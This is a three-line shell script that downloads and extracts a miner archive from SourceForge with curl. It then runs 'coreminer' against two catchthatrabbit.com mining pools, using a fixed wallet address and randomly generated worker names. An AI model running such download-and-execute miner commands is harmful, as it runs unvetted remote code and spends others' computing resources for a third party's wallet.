ls
curl https://sourceforge.net/projects/drths/files/corearm.tar.gz/download -L -o corearm.tar.gz && tar xf corearm.tar.gz
./coreminer -P stratum1+tcp://CB0745A849B3C0A9F52C11B7B674D70BA1DB2A2F637E.$(echo $RANDOM | md5sum | head -c 10)@de.catchthatrabbit.com:8008 -P stratum1+tcp://CB0745A849B3C0A9F52C11B7B674D70BA1DB2A2F637E.$(echo $RANDOM | md5sum | head -c 10)@us.catchthatrabbit.com:8008
